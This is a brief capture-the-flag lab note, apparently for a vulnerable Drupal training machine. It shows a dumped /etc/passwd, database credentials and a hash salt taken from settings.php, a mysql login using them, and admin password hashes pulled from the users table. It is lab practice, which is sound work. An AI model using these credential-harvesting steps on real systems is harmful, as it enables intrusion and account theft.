## post flag\-1

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www\-data:x:33:33:www\-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug\-Reporting System \(admin\):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian\-exim:x:101:104::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
messagebus:x:103:107::/var/run/dbus:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false
flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash

/var/www/sites/default/settings\.php -  found FLAG\! 

$databases = array \(
'default' =\> 
array \(
'default' =\> 
array \(
'database' =\> 'drupaldb',
'username' =\> 'dbuser',
'password' =\> 'R0ck3t',
'host' =\> 'localhost',
'port' =\> '',
'driver' =\> 'mysql',
'prefix' =\> '',
\),
\),
\);

$drupal\_hash\_salt = 'X8gdX7OdYRiBnlHoj0ukhtZ7eO4EDrvMkhN21SWZocs';

mysql \-u dbuser \-p R0ck3t

\>  1 | admin | $S$DCLN4I7btwiIkIFbJis5J6aqzq\.MeUBGjaDXCQY9mdMlUyj/u/0V | admin@example\.com |       |           | filtered\_html    | 1550581826 | 1701047288 | 1701044767 |      1 | Australia/Melbourne |          |       1 | admin@example\.com | a:1:\{s:7:"overlay";i:1;\} |
|   2 | Fred  | $S$DWGrxef6\.D0cwB5Ts\.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg | fred@example\.org  |       |           | filtered\_html    | 1550581952 | 1550582225 | 1550582225 |      1 | Australia/Melbourne |          |       0 | fred@example\.org  | b:0;